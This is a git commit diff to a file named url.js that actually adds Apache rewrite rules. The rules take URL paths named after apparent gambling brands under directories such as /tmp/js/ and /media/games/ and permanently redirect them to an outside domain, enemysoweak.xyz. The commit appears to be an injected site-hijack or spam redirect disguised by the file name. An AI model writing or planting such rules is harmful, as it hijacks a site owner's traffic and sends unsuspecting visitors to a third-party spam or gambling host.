33d2ec2c7d632b29eec763ff16e432f38ccfff35
2S Struggle Street <vyscomaylando@gmail.com>
2024-11-29 03:42:55 +0700

    Update url.js

--- url.js
+++ url.js
@@ -2,4 +2,16 @@
   
  RewriteEngine on
  RewriteCond %{REQUEST_URI}  ^/tmp/js/-/mata365/           [NC]
+RewriteRule /(.*) https://enemysoweak.xyz/kasihkeras/o138/$1 [R=301,L]
+
+RewriteEngine on
+ RewriteCond %{REQUEST_URI}  ^/media/games/mahadewi77/           [NC]
+RewriteRule /(.*) https://enemysoweak.xyz/kasihkeras/o138/$1 [R=301,L]
+
+RewriteEngine on
+ RewriteCond %{REQUEST_URI}  ^/tmp/js/-/jago189/           [NC]
+RewriteRule /(.*) https://enemysoweak.xyz/kasihkeras/o138/$1 [R=301,L]
+
+RewriteEngine on
+ RewriteCond %{REQUEST_URI}  ^/libraries/catizen/when/amosbet77/           [NC]
  RewriteRule /(.*) https://enemysoweak.xyz/kasihkeras/o138/$1 [R=301,L]
